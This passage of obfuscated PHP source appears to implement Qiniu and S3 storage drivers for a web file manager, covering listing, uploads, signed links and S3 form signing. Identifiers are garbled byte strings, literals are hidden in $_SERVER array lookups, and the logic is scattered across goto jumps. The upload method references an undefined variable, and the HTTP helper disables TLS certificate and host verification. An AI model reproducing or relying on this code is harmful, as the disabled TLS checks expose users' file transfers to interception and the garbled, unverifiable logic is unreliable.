($B„ÃİšÙ„) { $b‘†ÇöÔÎ·[$eíš…¦ƒÀµ[179]] = $this->has($FöÜÇØÒÛê, !1); $b‘†ÇöÔÎ·[$eíš…¦ƒÀµ[180]] = $this->has($FöÜÇØÒÛê, !0); } return $b‘†ÇöÔÎ·; } public function exist($b‘É¤˜‘Õ) { if ($this->isFile($b‘É¤˜‘Õ) || $this->isFolder($b‘É¤˜‘Õ)) { return !0; } return !1; } public function isFile($A÷âÂ Ş—Œ) { list($eï¡›ˆíÔİ, $aãÁÈÑ³Ïİ) = $this->bucketManager->stat($this->bucket, trim($A÷âÂ Ş—Œ, $_SERVER[ÍÓÖ€°å][8])); return $aãÁÈÑ³Ïİ ? !1 : !0; } public function isFolder($FŸçÕÚÕÛ) { goto f–ÚÓöÕÅ¹; f–ÚÓöÕÅ¹: $A²˜¾Äœ =& $_SERVER[ÍÓÖ€°å]; $c®¤İñ“ë = trim($FŸçÕÚÕÛ, $A²˜¾Äœ[8]); if (empty($c®¤İñ“ë)) { return !0; } goto Aõ…‡½˜’œ; Aõ…‡½˜’œ: $f“µˆ”à Ö = trim($FŸçÕÚÕÛ, $A²˜¾Äœ[8]) . $A²˜¾Äœ[8]; $BÇ‘´ÎŞ = $A²˜¾Äœ[33]; $D„Í÷Ïä¼ = 1; goto c““Âº•©É; d£§Õ†ƒˆÈ: return !1; goto c‹×Â·ñÈ; c““Âº•©É: $B©×İÇÙãø = $A²˜¾Äœ[8]; list($B„çˆœ£ÍÏ, $bøŞ´áæ¼) = $this->bucketManager->listFiles($this->bucket, $f“µˆ”à Ö, $BÇ‘´ÎŞ, $D„Í÷Ïä¼, $B©×İÇÙãø); if (!empty($B„çˆœ£ÍÏ[$A²˜¾Äœ[918]]) || !empty($B„çˆœ£ÍÏ[$A²˜¾Äœ[921]])) { return !0; } goto d£§Õ†ƒˆÈ; c‹×Â·ñÈ: } public function listPath($Bì•äëª……, $C×‹£ÌøŒ— = false, $aÔ¢«„šğÀ = false) { goto F’‹‚ƒ¿‘ã; cËäêåæƒ: $fĞè…£ª“³ = $B–Èßø´ä = array(); while (!0) { list($A‡¡İ¥º‘…, $EâàÕîˆãÉ) = $this->bucketManager->listFiles($this->bucket, $Aë×‘®›ğ, $e³ëÑ¹øäğ, $Fìªëïó«Š, $câ‘µ®¤áÊ); if ($EâàÕîˆãÉ) { return !1; } $e³ëÑ¹øäğ = array_key_exists($BÉ¯ÒŸ±ÒÕ[884], $A‡¡İ¥º‘…) ? $e³ëÑ¹øäğ = $A‡¡İ¥º‘…[$BÉ¯ÒŸ±ÒÕ[917]] : $BÉ¯ÒŸ±ÒÕ[33]; if (isset($A‡¡İ¥º‘…[$BÉ¯ÒŸ±ÒÕ[921]])) { foreach ($A‡¡İ¥º‘…[$BÉ¯ÒŸ±ÒÕ[921]] as $DÄ‚Ûª—) { if ($DÄ‚Ûª— == $Aë×‘®›ğ) { continue; } $fĞè…£ª“³[] = $this->folderInfo($DÄ‚Ûª—, $C×‹£ÌøŒ—, $aÔ¢«„šğÀ); } } if (isset($A‡¡İ¥º‘…[$BÉ¯ÒŸ±ÒÕ[918]])) { foreach ($A‡¡İ¥º‘…[$BÉ¯ÒŸ±ÒÕ[918]] as $eóÖÂ®Í’î) { if ($eóÖÂ®Í’î[$BÉ¯ÒŸ±ÒÕ[88]] == $Aë×‘®›ğ) { continue; } $B–Èßø´ä[] = $this->fileInfo($eóÖÂ®Í’î[$BÉ¯ÒŸ±ÒÕ[88]], $eóÖÂ®Í’î, $aÔ¢«„šğÀ); } } if ($e³ëÑ¹øäğ == $BÉ¯ÒŸ±ÒÕ[33]) { break; } } return array($BÉ¯ÒŸ±ÒÕ[75] => $fĞè…£ª“³, $BÉ¯ÒŸ±ÒÕ[74] => $B–Èßø´ä); goto cáğ ²‹; F’‹‚ƒ¿‘ã: $BÉ¯ÒŸ±ÒÕ =& $_SERVER[ÍÓÖ€°å]; $Bì•äëª…… = trim($Bì•äëª……, $BÉ¯ÒŸ±ÒÕ[8]); $Aë×‘®›ğ = empty($Bì•äëª……) ? $BÉ¯ÒŸ±ÒÕ[33] : $Bì•äëª…… . $BÉ¯ÒŸ±ÒÕ[8]; goto d¾›ÓËäæƒ; d¾›ÓËäæƒ: $e³ëÑ¹øäğ = $BÉ¯ÒŸ±ÒÕ[33]; $Fìªëïó«Š = 1000; $câ‘µ®¤áÊ = $BÉ¯ÒŸ±ÒÕ[8]; goto cËäêåæƒ; cáğ ²‹: } public function has($aÏì³¦¯¨·, $DÎªÈ¬å«ø = true) { goto fğ‚®ØÈà; eí™Ô¢±: $e»Ú‘Ö¯ôØ = $c¤›ÁÄ·Õ°[33]; $cö¡Ï††Ä = 100; $bé¬¢…¤ä¶ = $c¤›ÁÄ·Õ°[8]; goto E²Ó³í÷Á¼; fğ‚®ØÈà: $c¤›ÁÄ·Õ° =& $_SERVER[ÍÓÖ€°å]; $aÏì³¦¯¨· = trim($aÏì³¦¯¨·, $c¤›ÁÄ·Õ°[8]); $B„ºƒ°ŒšŠ = empty($aÏì³¦¯¨·) ? $c¤›ÁÄ·Õ°[33] : $aÏì³¦¯¨· . $c¤›ÁÄ·Õ°[8]; goto eí™Ô¢±; E²Ó³í÷Á¼: while (!0) { list($EÎ³Áíš²³, $b‘îÕê¶¬) = $this->bucketManager->listFiles($this->bucket, $B„ºƒ°ŒšŠ, $e»Ú‘Ö¯ôØ, $cö¡Ï††Ä, $bé¬¢…¤ä¶); if ($b‘îÕê¶¬) { return !1; } $e»Ú‘Ö¯ôØ = array_key_exists($c¤›ÁÄ·Õ°[884], $EÎ³Áíš²³) ? $e»Ú‘Ö¯ôØ = $EÎ³Áíš²³[$c¤›ÁÄ·Õ°[917]] : $c¤›ÁÄ·Õ°[33]; if ($DÎªÈ¬å«ø) { if (!empty($EÎ³Áíš²³[$c¤›ÁÄ·Õ°[918]])) { return !0; } } else { if (!empty($EÎ³Áíš²³[$c¤›ÁÄ·Õ°[921]])) { return !0; } } if ($e»Ú‘Ö¯ôØ == $c¤›ÁÄ·Õ°[33]) { break; } } return !1; goto aÇ×Óóßª; aÇ×Óóßª: } public function listAll($a·ÙÎùƒã») { $D†Ñï×’è¸ =& $_SERVER[ÍÓÖ€°å]; $DÂ…âˆØ¿ì = $this->fileList($a·ÙÎùƒã», 1); $AÆ…¼ÈÃ©× = array(); foreach ($DÂ…âˆØ¿ì as $DÂÈ§’ó¢) { $AÆ…¼ÈÃ©×[$DÂÈ§’ó¢[$D†Ñï×’è¸[28]]] = $DÂÈ§’ó¢[$D†Ñï×’è¸[78]]; } return $this->listAllFiles($a·ÙÎùƒã», array_keys($AÆ…¼ÈÃ©×), $AÆ…¼ÈÃ©×); } public function canRead($E‹­‚•Âİ‚) { return $this->exist($E‹­‚•Âİ‚) ? !0 : !1; } public function canWrite($EÙ‹ØÆ×ºÎ) { return $this->exist($EÙ‹ØÆ×ºÎ) ? !0 : !1; } public function getContent($DŒˆÕµ»¢Ì) { return $this->fileSubstr($DŒˆÕµ»¢Ì, 0, -1); } public function setContent($FŸ‚£â¦»÷, $Dëèãõ–ôí = '') { $Eæ“öñ¢Ö¤ = $this->tempFile($this->pathThis($FŸ‚£â¦»÷)); file_put_contents($Eæ“öñ¢Ö¤, $Dëèãõ–ôí); if ($this->upload($FŸ‚£â¦»÷, $Eæ“öñ¢Ö¤)) { $this->tempFileRemve($Eæ“öñ¢Ö¤); return !0; } return !1; } public function refreshUrls($B²í¶¹¶İ²) { goto E¥¬‚ó†ĞÖ; E¥¬‚ó†ĞÖ: $Eì¸¤Á‰Õ¼ =& $_SERVER[ÍÓÖ€°å]; $Få¾«îÙ§ë = array(); if (is_array($B²í¶¹¶İ²)) { foreach ($B²í¶¹¶İ² as $a–©¹óªˆğ) { $Få¾«îÙ§ë[] = $this->link($a–©¹óªˆğ); } } else { $Få¾«îÙ§ë[] = $this->link($B²í¶¹¶İ²); } goto C³é°ÎÀõ; C³é°ÎÀõ: $F§÷‡Ä½Ÿ = new Qiniu\Cdn\CdnManager($this->auth); list($eëñÀí’Á“, $F£Ÿò¼Ññ¹) = $F§÷‡Ä½Ÿ->refreshUrls($Få¾«îÙ§ë); if ($F£Ÿò¼Ññ¹) { return !1; } goto a™¸ÉÌöÛá; a™¸ÉÌöÛá: return $eëñÀí’Á“[$Eì¸¤Á‰Õ¼[922]] == $Eì¸¤Á‰Õ¼[444] ? !0 : !1; goto f¨µ”èÅÔ–; f¨µ”èÅÔ–: } public function fileSubstr($f§©ÈããÂ, $f›á±ë¾ŒÑ, $d£„ä³ôö) { $b§ì‰§ó»Ò =& $_SERVER[ÍÓÖ€°å]; if (!($A•ÅÆ½Ü° = $this->link($f§©ÈããÂ))) { return !1; } $dÛ¥âÌâ‰œ = array($b§ì‰§ó»Ò[887] => $f›á±ë¾ŒÑ, $b§ì‰§ó»Ò[317] => $d£„ä³ôö); return $this->qnRequest($A•ÅÆ½Ü°, $dÛ¥âÌâ‰œ); } public function upload($eßèÊ‡Ç™½, $aˆÚ–Ê¶‚¼, $bĞ„Ï‘‡Ë„ = false, $bè˜©Ôîí = REPEAT_REPLACE) { $c³øôØĞÖ = new Qiniu\Storage\UploadManager(); $e‡ÖŠÖÛ¹Ğ = $this->auth->uploadToken($this->bucket, $eßèÊ‡Ç™½); $f…ÃµĞ†‘Â = get_file_mime(get_path_ext($D×†ŒÙà³æ)); list($fí˜ÚÆ¬, $fÎİ±Í¾¡) = $c³øôØĞÖ->putFile($e‡ÖŠÖÛ¹Ğ, $eßèÊ‡Ç™½, $aˆÚ–Ê¶‚¼, null, $f…ÃµĞ†‘Â); return $fÎİ±Í¾¡ ? !1 : $this->getPathOuter($eßèÊ‡Ç™½); } public function getHost($bãòó¨áÅá = true) { $a­¹˜ÆŠ›½ =& $_SERVER[ÍÓÖ€°å]; $a«ÊÖ­Í¥ë = parse_url(trim($this->domain, $a­¹˜ÆŠ›½[8])); $CÍŠ¿ÓŒº = isset($a«ÊÖ­Í¥ë[$a­¹˜ÆŠ›½[156]]) ? $a«ÊÖ­Í¥ë[$a­¹˜ÆŠ›½[156]] : http_type(); $D˜†…‡¡á = isset($a«ÊÖ­Í¥ë[$a­¹˜ÆŠ›½[157]]) ? $a«ÊÖ­Í¥ë[$a­¹˜ÆŠ›½[157]] : $a«ÊÖ­Í¥ë[$a­¹˜ÆŠ›½[76]]; if (isset($a«ÊÖ­Í¥ë[$a­¹˜ÆŠ›½[158]])) { $D˜†…‡¡á .= $a­¹˜ÆŠ›½[4] . $a«ÊÖ­Í¥ë[$a­¹˜ÆŠ›½[158]]; } return $CÍŠ¿ÓŒº . $a­¹˜ÆŠ›½[159] . $D˜†…‡¡á; } public function uploadFormData($ešÕÔ³‘Û, $e›ò÷“ÏĞä = 3600) { return $this->uploadToken($ešÕÔ³‘Û, $e›ò÷“ÏĞä); } public function multiUploadFormData($AâÕŸÉ¢, $Bß¥¶Õ¹™™ = 3600) { return $this->uploadToken($AâÕŸÉ¢, $Bß¥¶Õ¹™™); } private function uploadToken($bĞ“á¡á¥, $CËĞ Ëçğ = 3600) { goto F´íàÏË©î; eˆĞš£¤˜: $AãìÇ‰Ì¯Ï = null; $bñ‰ ¸˜£Ç = $this->auth->uploadToken($this->bucket, $AãìÇ‰Ì¯Ï, $AöÙãÖ³¦Ş, $e¾çØŞ«†¼, !0); $FÇÙî´á¸ = empty($this->region) || $this->region == $CÏ—õˆÉéø[925] ? $CÏ—õˆÉéø[33] : $CÏ—õˆÉéø[489] . $this->region; goto AíÏ¤ËÚî; F´íàÏË©î: $CÏ—õˆÉéø =& $_SERVER[ÍÓÖ€°å]; $AöÙãÖ³¦Ş = $CËĞ Ëçğ; $e¾çØŞ«†¼ = array($CÏ—õˆÉéø[923] => $CÏ—õˆÉéø[924]); goto eˆĞš£¤˜; AíÏ¤ËÚî: $aÚœçØ™ë = http_type() . "\72\57\57\x75\x70\x6c\157\141\x64{$FÇÙî´á¸}\56\x71\x69\x6e\151\x75\160\x2e\143\x6f\155\57"; return array($CÏ—õˆÉéø[926] => $bñ‰ ¸˜£Ç, $CÏ—õˆÉéø[927] => $aÚœçØ™ë); goto AÙÖàõÄ­”; AÙÖàõÄ­”: } public function download($fÅ…Ş‡àÓ, $cßâ¤”øö) { goto e‡ÑåŠôÉß; déÇ²Ê…•´: while (!0) { $e‚‹×Œ…¯³ = array($b”ÈĞÙ†²·[887] => $D¡¨¸äÂ‡‹, $b”ÈĞÙ†²·[317] => $B¹®÷«‘); $BŒªª­Ç¼ö = $this->qnRequest($Cò¤„Âê¢¼, $e‚‹×Œ…¯³); if ($D¡¨¸äÂ‡‹ && ($B—ÁğÙß¢¥ = @json_decode($BŒªª­Ç¼ö, !0))) { if (isset($B—ÁğÙß¢¥[$b”ÈĞÙ†²·[922]])) { return !1; } } fwrite($CÁÂ½ØÅ¸Ù, $BŒªª­Ç¼ö); $D¡¨¸äÂ‡‹ += $B¹®÷«‘; if (strlen($BŒªª­Ç¼ö) < $B¹®÷«‘) { break; } } fclose($CÁÂ½ØÅ¸Ù); return $cßâ¤”øö; goto B÷åßâØ¿; AèêÑéÍ‹: $D¡¨¸äÂ‡‹ = 0; $B¹®÷«‘ = 1024 * 200; $CÁÂ½ØÅ¸Ù = fopen($aËÔƒÂ»•, $b”ÈĞÙ†²·[928]); goto déÇ²Ê…•´; e‡ÑåŠôÉß: $b”ÈĞÙ†²· =& $_SERVER[ÍÓÖ€°å]; $aËÔƒÂ»• = IO::getPathInner(IO::mkfile($cßâ¤”øö)); if (!($Cò¤„Âê¢¼ = $this->link($fÅ…Ş‡àÓ))) { return !1; } goto AèêÑéÍ‹; B÷åßâØ¿: } public function link($fÂ‹ô³‹Î, $EÆôĞ–£© = '') { if (!$this->isFile($fÂ‹ô³‹Î)) { return !1; } $FÖ†Ø÷© ğ = $this->getHost() . $_SERVER[ÍÓÖ€°å][8] . $this->pathEncode($fÂ‹ô³‹Î) . $EÆôĞ–£©; return $this->auth->privateDownloadUrl($FÖ†Ø÷© ğ, 3600 * 12); } public function fileOut($FªÛĞ¥ ä, $aŠËê†˜ùŒ = false, $AÑ¸¯˜íĞ² = false, $A˜îİÂ¬Ï = '') { $B—ÏĞâñ÷‡ =& $_SERVER[ÍÓÖ€°å]; if (!$AÑ¸¯˜íĞ²) { $AÑ¸¯˜íĞ² = $this->pathThis($FªÛĞ¥ ä); } $B«Ï›ñË¸± = $aŠËê†˜ùŒ ? $B—ÏĞâñ÷‡[929] . rawurlencode($AÑ¸¯˜íĞ²) : $B—ÏĞâñ÷‡[33]; $eöè§ÜíÌ² = $this->link($FªÛĞ¥ ä, $B«Ï›ñË¸±); $this->fileOutLink($eöè§ÜíÌ²); } public function fileOutServer($D¤ƒí²ÌÁ‘, $A›°›×‚–· = false, $f§Š‘Õ³Á = false, $bÙ‡Úñ¹¨ª = '') { parent::fileOut($D¤ƒí²ÌÁ‘, $A›°›×‚–·, $f§Š‘Õ³Á, $bÙ‡Úñ¹¨ª); } public function fileOutImage($FÉØ…Ï ’÷, $D§µà’¿¾ = 250) { $a¨Ú‰ÇÍ³Û = $this->link($FÉØ…Ï ’÷, $_SERVER[ÍÓÖ€°å][930] . $D§µà’¿¾); $this->fileOutLink($a¨Ú‰ÇÍ³Û); } public function fileOutImageServer($E•øÜªİïÄ, $D–Ëáï²Ä» = 250) { parent::fileOutImage($E•øÜªİïÄ, $D–Ëáï²Ä»); } public function fileOutLink($bù‹¶öºÂ) { header($_SERVER[ÍÓÖ€°å][146] . $bù‹¶öºÂ); die; } public function hashMd5($F‹ªª°æâù) { $DÛèŒã”ª˜ =& $_SERVER[ÍÓÖ€°å]; $FâÇ¶Š¿ö = $this->link($F‹ªª°æâù, $DÛèŒã”ª˜[931]); $DÅÃÉ‰†öè = $this->qnRequest($FâÇ¶Š¿ö, array(), !0); return !isset($DÅÃÉ‰†öè[$DÛèŒã”ª˜[185]]) ? !1 : $DÅÃÉ‰†öè[$DÛèŒã”ª˜[185]]; } private function fileInfoImage($bòŸŞ˜¶¿º, &$Cİ­¦Èâ à) { $aµäœíƒÈ =& $_SERVER[ÍÓÖ€°å]; if (!in_array($Cİ­¦Èâ à[$aµäœíƒÈ[148]], array($aµäœíƒÈ[196], $aµäœíƒÈ[149], $aµäœíƒÈ[197], $aµäœíƒÈ[198], $aµäœíƒÈ[199]))) { return; } if (!($FßÄ¼÷œœ = $this->link($bòŸŞ˜¶¿º, $aµäœíƒÈ[932]))) { return !1; } if (!($a’£ÅØÒ = $this->qnRequest($FßÄ¼÷œœ, array(), !0))) { return !1; } $Cİ­¦Èâ à[$aµäœíƒÈ[200]] = array($aµäœíƒÈ[201] => $a’£ÅØÒ[$aµäœíƒÈ[201]], $aµäœíƒÈ[868] => $a’£ÅØÒ[$aµäœíƒÈ[202]]); } public function qnRequest($Eà”‚¥Ç½§, $a«‚±ˆò½ = array(), $DºòöÔõ¯á = false) { goto fÇŠƒÈ”†Ä; fÇŠƒÈ”†Ä: $EÆ– Ó­„‡ =& $_SERVER[ÍÓÖ€°å]; $DöóóêËğ½ = curl_init(); curl_setopt($DöóóêËğ½, CURLOPT_URL, $Eà”‚¥Ç½§); goto fé­Úàã¾; dà¥ÏçÛÔ•: curl_setopt($DöóóêËğ½, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($DöóóêËğ½, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($DöóóêËğ½, CURLOPT_NOPROGRESS, !1); goto a»Û‡Üñè‘; fé­Úàã¾: curl_setopt($DöóóêËğ½, CURLOPT_RETURNTRANSFER, 1); curl_setopt($DöóóêËğ½, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($DöóóêËğ½, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto dà¥ÏçÛÔ•; a»Û‡Üñè‘: curl_setopt($DöóóêËğ½, CURLOPT_PROGRESSFUNCTION, $EÆ– Ó­„‡[933]); curl_progress_start($DöóóêËğ½); if (isset($a«‚±ˆò½[$EÆ– Ó­„‡[887]]) && $a«‚±ˆò½[$EÆ– Ó­„‡[317]] > 0) { $aßÂ…àØéˆ = $a«‚±ˆò½[$EÆ– Ó­„‡[887]]; $DÂññê»‘‹ = $a«‚±ˆò½[$EÆ– Ó­„‡[887]] + ($a«‚±ˆò½[$EÆ– Ó­„‡[317]] - 1); curl_setopt($DöóóêËğ½, CURLOPT_RANGE, "{$aßÂ…àØéˆ}\55{$DÂññê»‘‹}"); } goto cµØšëğ±; cµØšëğ±: curl_setopt($DöóóêËğ½, CURLOPT_FOLLOWLOCATION, 1); $D›¼ÕÀË–† = curl_exec($DöóóêËğ½); curl_progress_end($DöóóêËğ½); goto D™¶§¨Åââ; D™¶§¨Åââ: curl_close($DöóóêËğ½); if ($DºòöÔõ¯á) { return @json_decode($D›¼ÕÀË–†, !0); } return $D›¼ÕÀË–†; goto B²ªƒ‡µñ¥; B²ªƒ‡µñ¥: } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($f«éÚºÚ¡§) { parent::__construct($f«éÚºÚ¡§); } public function uploadFormData($a²ó¾¬™Î, $EÙ†Ÿâö–© = 3600) { goto c‘Áòš‚÷; cÙ¯àø¡‹: $D¥Ş¦—Ë± = array($this->accessKey, $a‡ğØ×Ÿâ¢, $this->region, $dæÆÇ–º“é, $BÙ“Ş®ğÆ); $DÌ¨¿Ã¦äî = implode($cˆ«øÃ„[8], $D¥Ş¦—Ë±); $a­Õ¢Ô‰ = array($cˆ«øÃ„[814] => gmdate($cˆ«øÃ„[813], strtotime($cˆ«øÃ„[837])), $cˆ«øÃ„[815] => array(array($cˆ«øÃ„[817] => $this->bucket), array($cˆ«øÃ„[816] => $AÚ¶ÒÀ†¿›), array($cˆ«øÃ„[818], $cˆ«øÃ„[819], $cˆ«øÃ„[33]), array($cˆ«øÃ„[818], $cˆ«øÃ„[838], $cˆ«øÃ„[33]), array($cˆ«øÃ„[818], $cˆ«øÃ„[839], $cˆ«øÃ„[33]), array($cˆ«øÃ„[820] => $få¢óŠàˆÇ), array($cˆ«øÃ„[840] => $DÌ¨¿Ã¦äî), array($cˆ«øÃ„[841] => $dÃ…‡ÛÁ„), array($cˆ«øÃ„[842] => $c ‘¼©Ôº¨), array($cˆ«øÃ„[843] => $c‘¥Ú¿„ñ))); goto C„Ñ×°ßº ; cå‚×ÔŸ: $BÙ“Ş®ğÆ = $cˆ«øÃ„[836]; $c‘¥Ú¿„ñ = $EÙ†Ÿâö–© . $cˆ«øÃ„[33]; $få¢óŠàˆÇ = $cˆ«øÃ„[812]; goto cÙ¯àø¡‹; b¡ê¸‡·Â: $dìì–õâì = hash_hmac($cˆ«øÃ„[844], $dæÆÇ–º“é, $D‰ã‘½ÃĞ¨, !0); $eØ¶£À¬„‹ = hash_hmac($cˆ«øÃ„[844], $BÙ“Ş®ğÆ, $dìì–õâì, !0); $B½ÙÕÏŞ»Ş = hash_hmac($cˆ«øÃ„[844], $AÁ³ï¥ªÈŸ, $eØ¶£À¬„‹); goto FêÖ³ë×”É; c‘Áòš‚÷: $cˆ«øÃ„ =& $_SERVER[ÍÓÖ€°å]; $AÚ¶ÒÀ†¿› = $cˆ«øÃ„[173]; $dÃ…‡ÛÁ„ = $cˆ«øÃ„[834]; goto Cè²³„; Cè²³„: $dæÆÇ–º“é = $cˆ«øÃ„[59]; $c ‘¼©Ôº¨ = gmdate($cˆ«øÃ„[835]); $a‡ğØ×Ÿâ¢ = gmdate($cˆ«øÃ„[438]); goto cå‚×ÔŸ; FêÖ³ë×”É: $F—°ÁÙÂÍ = array($cˆ«øÃ„[187] => $cˆ«øÃ„[33], $cˆ«øÃ„[846] => $cˆ«øÃ„[33], $cˆ«øÃ„[816] => $AÚ¶ÒÀ†¿›, $cˆ«øÃ„[820] => $få¢óŠàˆÇ, $cˆ«øÃ„[824] => $AÁ³ï¥ªÈŸ, $cˆ«øÃ„[847] => $DÌ¨¿Ã¦äî, $cˆ«øÃ„[848] => $dÃ…‡ÛÁ„, $cˆ«øÃ„[849] => $c ‘¼©Ôº¨, $cˆ«øÃ„[850] => $c‘¥Ú¿„ñ, $cˆ«øÃ„[851] => $B½ÙÕÏŞ»Ş, $cˆ«øÃ„[157] => $this->getHost()); return $F—°ÁÙÂÍ; goto aïè²Í¸Œ; C„Ñ×°ßº : $AÁ³ï¥ªÈŸ = base64_encode(json_encode($a­Õ¢Ô‰)); $Dø‹×á½¥é = hash_hmac($cˆ«øÃ„[844], $a‡ğØ×Ÿâ¢, $cˆ«øÃ„[845] . $this->secret, !0); $D‰ã‘½ÃĞ¨ = hash_hmac($cˆ«øÃ„[844], $this->region, $Dø‹×á½¥é, !0); goto b¡ê¸‡·Â; aïè²Í¸Œ: } public function multiUploadFormData($Eí°‡¯§ù˜, $AÆ»§ÂÔ¥Ó = 3600) { $f©…³åİÄ± =& $_SERVER[ÍÓÖ€°å]; $E­Ÿ‹†¤¨ï = gmdate($f©…³åİÄ±[934]); $fö¬Õ§âÑ® = array(); $dîĞÊ¾Ìöê = $this->client->getUploadId($this->bucket, $Eí°‡¯§ù˜, $fö¬Õ§âÑ®); if (!$dîĞÊ¾Ìöê) { return !1; } return array($f©…³åİÄ±[204] => $dîĞÊ¾Ìöê, $f©…³åİÄ±[157] => $this->getHost() . $f©…³åİÄ±[8] . $this->pathEncode($Eí°‡¯§ù˜), $f©…³åİÄ±[205] => $E­Ÿ‹†¤¨ï, $f©…³åİÄ±[88] => $Eí°‡¯§ù˜); } public function multiUploadAuthData($D¸–‘é²­Ê, $C“¦’¼ª‹ = array()) { goto Dß£ÙÉ¿©Ÿ; c¼´…·ÁØ: unset($C“¦’¼ª‹[$D“Õ›ÙÖ [88]]); if (isset($C“¦’¼ª‹[$D“Õ›ÙÖ [206]])) { return $this->listUploadParts($e©•ˆ·, $C“¦’¼ª‹); } $DÛÑ§Ñ”É = array(); goto c¾’Ø˜ïçï; Dß£ÙÉ¿©Ÿ: $D“Õ›ÙÖ  =& $_SERVER[ÍÓÖ€°å]; $a²• ‘¬¿ğ = isset($C“¦’¼ª‹[$D“Õ›ÙÖ [148]]) ? $C“¦’¼ª‹[$D“Õ›ÙÖ [148]] : $D“Õ›ÙÖ [33]; $e©•ˆ· = $C“¦’¼ª‹[$D“Õ›ÙÖ [88]]; goto c¼´…·ÁØ; c¾’Ø˜ïçï: if (isset($C“¦’¼ª‹[$D“Õ›ÙÖ [935]])) { $DÛÑ§Ñ”É[$D“Õ›ÙÖ [936]] = $C“¦’¼ª‹[$D“Õ›ÙÖ [935]]; } $f´â®·ˆ„â = explode($D“Õ›ÙÖ [159], $this->getHost()); $fõœ‡¡º° = array($D“Õ›ÙÖ [937] => $f´â®·ˆ„â[1], $D“Õ›ÙÖ [938] => $D“Õ›ÙÖ [33], $D“Õ›ÙÖ [187] => $D“Õ›ÙÖ [105], $D“Õ›ÙÖ [846] => $C“¦’¼ª‹[$D“Õ›ÙÖ [78]]); goto A§Ì•âÃÎ; a½õ‘ßğ©á: if (strpos($a²• ‘¬¿ğ, $D“Õ›ÙÖ [208]) === 0) { if (isset($DÛÑ§Ñ”É[$D“Õ›ÙÖ [936]])) { $Añ·çÙà‡ = $DÛÑ§Ñ”É[$D“Õ›ÙÖ [936]]; } else { if (isset($AŞÔÛÔÌ“Ñ[$D“Õ›ÙÖ [936]])) { $Añ·çÙà‡ = $AŞÔÛÔÌ“Ñ[$D“Õ›ÙÖ [936]]; } else { $Añ·çÙà‡ = hash($D“Õ›ÙÖ [844], $D“Õ›ÙÖ [33]); } } return array($D“Õ›ÙÖ [215] => $AŞÔÛÔÌ“Ñ[$D“Õ›ÙÖ [215]], $D“Õ›ÙÖ [936] => $Añ·çÙà‡, $D“Õ›ÙÖ [205] => $AŞÔÛÔÌ“Ñ[$D“Õ›ÙÖ [939]]); } return $AŞÔÛÔÌ“Ñ[$D“Õ›ÙÖ [215]]; goto B”ø‘°„¼; A§Ì•âÃÎ: $Fİ¥ìÅ›Ş„ = $D“Õ›ÙÖ [209]; $bÑíÚ‚êÙ = $D“Õ›ÙÖ [8] . $this->pathEncode($e©•ˆ·) . $a²• ‘¬¿ğ; $AŞÔÛÔÌ“Ñ = $this->client->__getSignatureV4($DÛÑ§Ñ”É, $fõœ‡¡º°, $Fİ¥ìÅ›Ş„, $bÑíÚ‚êÙ); goto a½õ‘ßğ©á; B”ø‘°„¼: } public function listUploadParts($B¦¾İÜã›Ñ, $E‹ˆ×ˆ‚ŒÎ = array()) { goto AÔƒ©õ×ğ; BŠÁÎ×‰²Ï: if (!$AÔçÙèÑó) { return !1; } $EØ¾Ñ²ŒÄ• = $e“„‹‡ £·[940]; foreach ($AÔçÙèÑó as $bÌè…æÕ) { $EØ¾Ñ²ŒÄ• .= $e“„‹‡ £·[941] . "\x3c\x50\x61\x72\x74\x4e\165\x6d\x62\x65\162\x3e{$bÌè…æÕ[$e“„‹‡ £·[889]]}\x3c\x2f\x50\141\x72\164\116\165\155\142\145\162\x3e\12" . "\74\105\x54\141\147\x3e{$bÌè…æÕ[$e“„‹‡ £·[890]]}\74\57\x45\x54\x61\147\76\12" . $e“„‹‡ £·[942]; } goto eÒ†¦¡›ÒŠ; D¶ŒÄ¶Šš: $e¸ÓÜ°ôğò = $this->client->__getSignatureV4($aéñ©Á«ÅĞ, $B®›¶ñø•, $fò”­ÇÉµß, $AÆ½º¨¯ù‹, $EØ¾Ñ²ŒÄ•); return array($e“„‹‡ £·[215] => $e¸ÓÜ°ôğò[$e“„‹‡ £·[215]], $e“„‹‡ £·[205] => $e¸ÓÜ°ôğò[$e“„‹‡ £·[939]], $e“„‹‡ £·[217] => $AÔçÙèÑó, $e“„‹‡ £·[936] => $e¸ÓÜ°ôğò[$e“„‹‡ £·[936]]); goto CĞ‹ĞÓâ”¶; eÒ†¦¡›ÒŠ: $EØ¾Ñ²ŒÄ• .= $e“„‹‡ £·[943]; $aéñ©Á«ÅĞ = array(); $b½¢È„ğåŠ = explode($e“„‹‡ £·[159], $this->getHost()); goto EÍÄ©ô°£Ä; EÍÄ©ô°£Ä: $B®›¶ñø• = array($e“„‹‡ £·[937] => $b½¢È„ğåŠ[1], $e“„‹‡ £·[187] => $e“„‹‡ £·[105], $e“„‹‡ £·[846] => strlen($EØ¾Ñ²ŒÄ•)); $fò”­ÇÉµß = $e“„‹‡ £·[207]; $AÆ½º¨¯ù‹ = $e“„‹‡ £·[8] . $this->pathEncode($B¦¾İÜã›Ñ) . $E‹ˆ×ˆ‚ŒÎ[$e“„‹‡ £·[148]]; goto D¶ŒÄ¶Šš; AÔƒ©õ×ğ: $e“„‹‡ £· =& $_SERVER[ÍÓÖ€°å]; $B»¿ªçå”ê = str_replace($e“„‹‡ £·[216], $e“„‹‡ £·[33], $E‹ˆ×ˆ‚ŒÎ[$e“„‹‡ £·[148]]); $AÔçÙèÑó = $this->client->listParts($this->bucket, $B¦¾İÜã›Ñ, $B»¿ªçå”ê); goto BŠÁÎ×‰²Ï; CĞ‹ĞÓâ”¶: } public function link($fö‰¦ò¸Ò, $C³æĞéì• = array()) { return parent::link($fö‰¦ò¸Ò, $C³æĞéì•); } public function fileOut($D‡Á™Õİ‹ë, $c¸Ë…Éë‹Ä = false, $CƒÃÙ²š¸ = false, $Fôîİ–õõ½ = '') { if (strstr($this->endpoint, $_SERVER[ÍÓÖ€°å][944])) { return parent::fileOutServer($D‡Á™Õİ‹ë, $c¸Ë…Éë‹Ä, $CƒÃÙ²š¸, $Fôîİ–õõ½); } parent::fileOut($D‡Á™Õİ‹ë, $c¸Ë…Éë‹Ä, $CƒÃÙ²š¸, $Fôîİ–õõ½); } public function fileOutImage($EÉ ·Áºëè, $EÌØËÇË£– = 250) { if 